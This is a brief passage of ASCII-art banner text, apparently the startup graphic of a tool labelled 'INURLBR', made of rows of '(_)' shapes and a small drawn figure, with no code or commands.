-(_)(_)(_)         (_)         (_)        (_)(_)(_)(_)       (_)         (_)      (_)(_)(_)(_)(_)      (_)(_)(_)(_)         (_)         (_)   
-                                                                                                                                                   
 ", "
                                      /~\
                                     |oo )      /INURLBR
